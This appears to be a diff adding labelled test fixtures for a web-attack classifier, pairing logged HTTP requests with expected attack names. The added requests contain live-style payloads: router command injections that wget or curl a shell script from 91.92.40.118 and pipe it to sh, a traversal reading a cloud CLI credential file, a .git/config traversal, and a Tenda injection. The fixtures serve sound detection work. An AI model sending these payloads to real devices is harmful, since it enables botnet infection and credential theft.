@@ -2588,5 +2588,55 @@
     "body": "{\"workflowData\":{\"nodes\":[{\"parameters\":{\"command\":\"id\"}}]}}",
     "expected_purpose": "rce",
     "expected_name": "n8n Workflow Execution RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/cgi-bin/cstecgi.cgi",
+    "ua": "",
+    "body": "topicurl=setScheduleCfg&switch=%60cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20tx5k%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20tx5k%3Bcurl%20http://91.92.40.1",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "TOTOLINK cstecgi RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/JNAP/",
+    "ua": "",
+    "body": "device_name=cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lwps%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%2",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Linksys JNAP API Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/../../../../../../../root/.vultr-cli.yaml",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 (Silvy X Ran; +https://silvyxran.love; +https://silver.inc)",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Cloud CLI Credential File Access"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/publics/%2egit/config",
+    "ua": "curl/8.7.1",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Encoded .git/config Traversal Bypass"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/goform/setUsbUnload/.js?deviceName=A;id",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Tenda Router Command Injection"
   }
 ]
